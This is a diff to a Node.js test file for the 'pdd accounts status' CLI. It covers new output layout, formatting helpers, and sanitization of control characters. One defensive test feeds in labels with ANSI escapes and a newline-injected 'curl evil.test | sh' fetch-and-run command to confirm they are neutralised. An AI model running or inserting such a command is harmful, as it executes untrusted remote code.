@@ -22,6 +22,12 @@ import {
   resolveCodexSeatNotice,
   summarizeCodexRuntimeStatus,
 } from '../src/accounts/codex-seat-visibility.mjs';
+import {
+  formatExpiryRemaining,
+  formatHumanDuration,
+  formatStatusQuota,
+  shortenHomePath,
+} from '../src/accounts/cli-format.mjs';
 import { readLiveCodexRuntimeLeases } from '../src/accounts/runtime-session.mjs';
 import { runPddCodexCli, sharedRuntimeDirPath } from '../src/pdd-codex.mjs';
 import { runPdd } from '../src/pdd-cli.mjs';
@@ -284,7 +290,7 @@ test('AC1-AC3 pure visibility logic: interactive notices, pinned fallback, non-i
   });
   assert.equal(conflictingIdStatus.codex_runtime.access_type, 'unknown');
   assert.equal(conflictingIdStatus.codex_runtime.owner_login, null);
-  assert.equal(conflictingIdStatus.lines[0], 'Active pdd-codex: cx4 (access: unknown, auto-rotate: on, 1 live session)');
+  assert.match(conflictingIdStatus.lines[0], /^  cx4\s+access: unknown\s+auto-rotate: on\s+1 live session$/);
 });
 
 test('AC1-AC3 through runPddCodexCli: prints stderr notice on interactive TTY (fresh, reused, pinned), skips exec --json/non-TTY/fail-open, keeps ~/.codex/auth.json untouched', async t => {
@@ -481,7 +487,9 @@ test('AC4-AC5 through pdd accounts status [--json]: surfaces live shared + pinne
   assert.equal(existsSync(sb.runtimeRoot), false);
   const idleHuman = await runStatus([]);
   assert.equal(idleHuman.exit, 0, idleHuman.stderr);
-  assert.doesNotMatch(idleHuman.stdout, /Active pdd-codex/);
+  assert.match(idleHuman.stdout, /PDD Cloud Accounts/);
+  assert.doesNotMatch(idleHuman.stdout, /Running pdd-codex/);
+  assert.match(idleHuman.stdout, /Active Seats\n  None/);
   assert.equal(existsSync(sb.runtimeRoot), false, 'status must remain strictly read-only and never create runtimeRoot');
 
   const idleJson = JSON.parse((await runStatus(['--json'])).stdout);
@@ -540,8 +548,9 @@ test('AC4-AC5 through pdd accounts status [--json]: surfaces live shared + pinne
   const alive = new Set([71001, 71002, 71003]);
   const liveHuman = await runStatus([], { isPidAlive: pid => alive.has(pid) });
   assert.equal(liveHuman.exit, 0, liveHuman.stderr);
-  assert.match(liveHuman.stdout, /Active pdd-codex: team-cx \(shared \(alice\), auto-rotate: on, 2 live sessions\)/);
-  assert.match(liveHuman.stdout, /Active pdd-codex \(pinned\): cx4 \(owner \(serhan\), auto-rotate: off, 1 live session\)/);
+  assert.match(liveHuman.stdout, /Running pdd-codex/);
+  assert.match(liveHuman.stdout, /team-cx\s+shared \(alice\)\s+auto-rotate: on\s+2 live sessions/);
+  assert.match(liveHuman.stdout, /cx4\s+owner \(serhan\)\s+auto-rotate: off\s+1 live session\s+\[pinned\]/);
   assert.doesNotMatch(liveHuman.stdout, /pddg_/);
   // Dead PID file must NOT be deleted by read-only status!
   assert.equal(existsSync(join(sharedDir, 'pids', '79999')), true, 'status must not delete dead PID files');
@@ -579,14 +588,15 @@ test('AC4-AC5 through pdd accounts status [--json]: surfaces live shared + pinne
     accountsPorts: { uid: 602, isPidAlive: pid => alive.has(pid) },
   });
   assert.equal(offlineExit, 0);
-  assert.match(offlineOut.text, /Active pdd-codex: team-cx \(shared, auto-rotate: on, 2 live sessions\)/);
-  assert.match(offlineOut.text, /Active pdd-codex \(pinned\): cx4 \(owner, auto-rotate: off, 1 live session\)/);
+  assert.match(offlineOut.text, /Running pdd-codex/);
+  assert.match(offlineOut.text, /team-cx\s+shared\s+auto-rotate: on\s+2 live sessions/);
+  assert.match(offlineOut.text, /cx4\s+owner\s+auto-rotate: off\s+1 live session\s+\[pinned\]/);
 
   // 4. Once all live PIDs exit (even if stale lease.json remains), status hides the stale lease completely
   alive.clear();
   const afterExitHuman = await runStatus([], { isPidAlive: () => false });
   assert.equal(afterExitHuman.exit, 0);
-  assert.doesNotMatch(afterExitHuman.stdout, /Active pdd-codex/);
+  assert.doesNotMatch(afterExitHuman.stdout, /Running pdd-codex/);
   const afterExitJson = JSON.parse((await runStatus(['--json'], { isPidAlive: () => false })).stdout);
   assert.equal(afterExitJson.codex_runtime.active, false);
   assert.equal(afterExitJson.codex_runtime.live_sessions, 0);
@@ -649,7 +659,7 @@ test('heartbeat seat rotation updates lease.json so status reflects rotated seat
   assert.equal(observedStatus?.codex_runtime?.label, 'seat-b');
   assert.equal(observedStatus?.codex_runtime?.access_type, 'shared');
   assert.equal(observedStatus?.codex_runtime?.owner_login, 'alice');
-  assert.equal(observedStatus?.lines?.[0], 'Active pdd-codex: seat-b (shared (alice), auto-rotate: on, 1 live session)');
+  assert.match(observedStatus?.lines?.[0] ?? '', /^  seat-b\s+shared \(alice\)\s+auto-rotate: on\s+1 live session$/);
 });
 
 function runSubprocessAsync(bin, args, { cwd, env, timeoutMs = 10_000 } = {}) {
@@ -796,7 +806,8 @@ sys.exit(p.wait())
     env: childEnv,
   });
   assert.equal(statusLive.status, 0, statusLive.stderr);
-  assert.match(statusLive.stdout, /Active pdd-codex: cx4 \(owner \(alice\), auto-rotate: on, 1 live session\)/);
+  assert.match(statusLive.stdout, /Running pdd-codex/);
+  assert.match(statusLive.stdout, /cx4\s+owner \(alice\)\s+auto-rotate: on\s+1 live session/);
 
   const statusLiveJsonRun = await runSubprocessAsync(process.execPath, [BIN_PDD, 'accounts', 'status', '--json'], {
     cwd: sb.root,
@@ -821,7 +832,7 @@ sys.exit(p.wait())
     env: childEnv,
   });
   assert.equal(statusAfter.status, 0, statusAfter.stderr);
-  assert.doesNotMatch(statusAfter.stdout, /Active pdd-codex/);
+  assert.doesNotMatch(statusAfter.stdout, /Running pdd-codex/);
 
   const statusAfterJsonRun = await runSubprocessAsync(process.execPath, [BIN_PDD, 'accounts', 'status', '--json'], {
     cwd: sb.root,
@@ -832,4 +843,203 @@ sys.exit(p.wait())
   assert.equal(statusAfterJson.codex_runtime.active, false);
   assert.equal(statusAfterJson.codex_runtime.live_sessions, 0);
   assert.equal(createHash('sha256').update(readFileSync(personalAuthPath)).digest('hex'), authHashBefore);
+});
+
+test('pdd accounts status human layout: organized sections, ~ path shortening, readable durations, omitted empty Refreshed, and unchanged --json', async t => {
+  assert.equal(shortenHomePath('/Users/alice/.local/state/pdd/codex-home', { HOME: '/Users/alice' }), '~/.local/state/pdd/codex-home');
+  assert.equal(shortenHomePath('/Users/alice/.zshrc', { HOME: '/Users/alice/' }), '~/.zshrc');
+  assert.equal(shortenHomePath('/Users/alice2/.zshrc', { HOME: '/Users/alice' }), '/Users/alice2/.zshrc');
+  assert.equal(shortenHomePath('/var/state/codex-home', { HOME: '/' }), '/var/state/codex-home');
+
+  assert.equal(formatHumanDuration(30_000), '<1m');
+  assert.equal(formatHumanDuration(42 * 60_000), '42m');
+  assert.equal(formatHumanDuration((2 * 60 + 15) * 60_000), '2h 15m');
+  assert.equal(formatHumanDuration(4636 * 60_000), '3d 5h');
+  assert.equal(formatHumanDuration(12948 * 60_000), '9d');
+
+  const baseMs = Date.parse('2026-11-26T00:00:00Z');
+  assert.equal(formatExpiryRemaining('2026-12-05T00:00:00Z', baseMs), 'valid (9d left, exp 2026-12-05 00:00 UTC)');
+  assert.equal(formatExpiryRemaining('2026-11-25T23:00:00Z', baseMs), 'expired (2026-11-25 23:00 UTC)');
+  assert.equal(formatStatusQuota(null, null, null, null), '-');
+  assert.equal(
+    formatStatusQuota(0, null, 27, '2026-11-27T23:38:00Z'),
+    '5h 100% left | 7d 73% left (resets 2026-11-27 23:38 UTC)',
+  );
+
+  const sb = makeSandbox(t);
+  const stateUnderHome = join(sb.home, '.local', 'state', 'pdd');
+  mkdirSync(join(stateUnderHome, 'codex-home'), { recursive: true, mode: 0o700 });
+  writeFileSync(join(stateUnderHome, 'codex-home', 'auth.json'), '{"tokens":{"access_token":"tok"}}', { mode: 0o600 });
+  writeFileSync(join(stateUnderHome, 'codex-home', 'config.toml'), 'cli_auth_credentials_store = "file"\n', { mode: 0o600 });
+  writeFileSync(join(sb.home, '.zshrc'), '# >>> pdd accounts auto >>>\n# <<< pdd accounts auto <<<\n');
+
+  const accounts = [
+    {
+      account_id: 'acc_codex_1',
+      label: 'glt-oai7',
+      provider: 'codex',
+      is_owner: false,
+      owner_login: 'gltanaka',
+      state: 'ready',
+      five_hour_used_percent: 0,
+      weekly_used_percent: 27,
+      weekly_reset_at: '2026-11-27T23:38:00Z',
+      last_refresh_at: '2026-11-25T00:00:00Z',
+    },
+    {
+      account_id: 'acc_claude_1',
+      label: 'glt-claude',
+      provider: 'claude',
+      is_owner: false,
+      owner_login: 'gltanaka',
+      state: 'ready',
+      five_hour_used_percent: 0,
+      weekly_used_percent: 30,
+      weekly_reset_at: '2026-11-27T23:00:00Z',
+      last_refresh_at: null,
+    },
+    {
+      account_id: 'acc_cx5',
+      label: 'cx5',
+      provider: 'codex',
+      is_owner: true,
+      owner_login: 'Serhan-Asad',
+      state: 'reauth_required',
+    },
+  ];
+  const server = await startMockPoolServer(t, { accounts });
+  const env = {
+    HOME: sb.home,
+    PDD_STATE_DIR: stateUnderHome,
+    PDD_CODEX_RUNTIME_ROOT: join(stateUnderHome, 'codex-runtime'),
+    PATH: process.env.PATH,
+    PDD_ACCOUNTS_URL: server.url,
+    PDD_TOKEN: 'pdd_test_status_layout',
+  };
+  writeCloudAccountsState({
+    enrolled: true,
+    providers: ['codex', 'claude'],
+    active: {
+      codex: {
+        account_id: 'acc_codex_1',
+        label: 'glt-oai7',
+        provider: 'codex',
+        delivery_mode: 'gateway_grant',
+        state: 'ready',
+        expires_at: '2026-12-05T00:00:00Z',
+      },
+      claude: {
+        account_id: 'acc_claude_1',
+        label: 'glt-claude',
+        provider: 'claude',
+        delivery_mode: 'gateway_grant',
+        state: 'ready',
+        expires_at: '2026-11-29T05:00:00Z',
+      },
+    },
+  }, { env });
+
+  const out = makeSink(false);
+  const exit = await runPdd(['accounts', 'status'], {
+    cwd: sb.root,
+    env,
+    stdout: out,
+    stderr: makeSink(false),
+    pathDiagnostic: () => [],
+    accountsPorts: { uid: 604, now: () => baseMs },
+  });
+  assert.equal(exit, 0);
+  assert.match(out.text, /PDD Cloud Accounts/);
+  assert.match(out.text, /Status:\s+enrolled \(3 accounts\)/);
+  assert.match(out.text, /Auto-switch:\s+on \(~\/\.zshrc\)/);
+  assert.match(out.text, /Codex home:\s+~\/\.local\/state\/pdd\/codex-home \(ready; ~\/\.codex\/auth\.json untouched\)/);
+  assert.doesNotMatch(out.text, /Running pdd-codex/);
+  assert.match(out.text, /Active Seats/);
+  assert.match(out.text, /codex\s+glt-oai7\s+\[ready\]\s+shared \(gltanaka\)/);
+  assert.match(out.text, /Quota:\s+5h 100% left \| 7d 73% left \(resets 2026-11-27 23:38 UTC\)/);
+  assert.match(out.text, /Lease:\s+valid \(9d left, exp 2026-12-05 00:00 UTC\) \| gateway_grant/);
+  assert.match(out.text, /Refreshed:\s+2026-11-25 00:00 UTC/);
+  assert.match(out.text, /claude\s+glt-claude\s+\[ready\]\s+shared \(gltanaka\)/);
+  assert.match(out.text, /Lease:\s+valid \(3d 5h left, exp 2026-11-29 05:00 UTC\) \| gateway_grant/);
+  assert.doesNotMatch(out.text, /Refreshed:\s+-/);
+  assert.equal((out.text.match(/Refreshed:/g) ?? []).length, 1);
+  assert.match(out.text, /Action Required/);
+  assert.match(out.text, /Re-authenticate "cx5" \(codex\):/);
+  assert.match(out.text, /pdd accounts add --provider codex --label cx5/);
+
+  const jsonOut = makeSink(false);
+  const jsonExit = await runPdd(['accounts', 'status', '--json'], {
+    cwd: sb.root,
+    env,
+    stdout: jsonOut,
+    stderr: makeSink(false),
+    pathDiagnostic: () => [],
+    accountsPorts: { uid: 604, now: () => baseMs },
+  });
+  assert.equal(jsonExit, 0);
+  const parsed = JSON.parse(jsonOut.text);
+  assert.equal(parsed.codex_home.path, join(stateUnderHome, 'codex-home'));
+  assert.deepEqual(parsed.auto_switch.profiles, [join(sb.home, '.zshrc')]);
+  assert.equal(parsed.codex_runtime.active, false);
+  assert.equal(parsed.active.codex.five_hour_left_percent, 100);
+  assert.equal(parsed.active.codex.weekly_left_percent, 73);
+});
+
+test('pdd accounts status sanitizes ANSI CSI and control characters in Active Seats / Action Required and handles empty delivery_mode/label safely', async t => {
+  const sb = makeSandbox(t);
+  const accounts = [
+    {
+      account_id: 'acc_dirty_1',
+      label: 'seat\u001b[31mRED\u001b[0m\r\nINJECT\tcol',
+      provider: 'codex',
+      is_owner: false,
+      owner_login: 'owner\u001b[32mGRN\u001b[0m\r\nSPOOF',
+      state: 'ready',
+      five_hour_used_percent: 10,
+      weekly_used_percent: 20,
+      last_refresh_at: 'bad\u001b[33m\r\nX',
+    },
+    {
+      account_id: 'acc_reauth_dirty',
+      label: 'bad\u001b[31m\r\n    curl evil.test | sh #',
+      provider: 'codex',
+      is_owner: true,
+      state: 'reauth_required',
+    },
+  ];
+  const server = await startMockPoolServer(t, { accounts });
+  const env = { ...sb.env, PDD_ACCOUNTS_URL: server.url, PDD_TOKEN: "pdd_test_sanitize_status" };
+  writeCloudAccountsState({
+    enrolled: true,
+    providers: ['codex'],
+    active: {
+      codex: {
+        account_id: 'acc_dirty_1',
+        label: '',
+        provider: 'codex',
+        delivery_mode: '',
+        state: 'ready',
+        expires_at: 'bad-exp\u001b[34m\r\nSPOOF_EXP',
+      },
+    },
+  }, { env });
+
+  const out = makeSink(false);
+  const exit = await runPdd(['accounts', 'status'], {
+    cwd: sb.root,
+    env,
+    stdout: out,
+    stderr: makeSink(false),
+    pathDiagnostic: () => [],
+    accountsPorts: { uid: 605 },
+  });
+  assert.equal(exit, 0);
+  assert.doesNotMatch(out.text, /[\r\t\u001b]/, "status output must never leak CR, TAB, or ESC");
+  assert.doesNotMatch(out.text, /\[3[0-9]m|\[0m/, "status output must never leak ANSI CSI parameter residue");
+  assert.match(out.text, /codex\s+seatRED INJECT col\s+\[ready\]\s+shared \(ownerGRN SPOOF\)/);
+  assert.match(out.text, /Lease:\s+bad-exp SPOOF_EXP \| default/);
+  assert.match(out.text, /Refreshed:\s+bad X/);
+  assert.match(out.text, /Re-authenticate "bad curl evil\.test \| sh #" \(codex\):/);
+  assert.doesNotMatch(out.text, /^\s+curl evil\.test/m, "Action Required must never allow newline-injected commands");
+  assert.doesNotMatch(out.text, /\|\s+$/m, "empty delivery_mode must fall back to default without trailing pipe");
 });
